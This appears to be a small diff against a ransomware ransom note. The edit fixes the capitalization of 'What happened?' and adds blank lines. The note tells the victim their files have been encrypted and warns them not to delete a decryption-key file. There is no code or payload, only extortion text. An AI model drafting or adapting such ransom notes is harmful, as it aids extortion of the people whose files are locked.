@@ -1,6 +1,5 @@
     
-    
-    what happened? ?
+    What happened? ?
          Some of your files have been encrypted by us.
 
 
@@ -24,6 +23,10 @@
 
          Please do not delete the decryption key D: \\ This is very important .. You cannot delete me.txt
          If you lose the decryption key, your data will be lost forever.
+
+
+
+
 
 
 
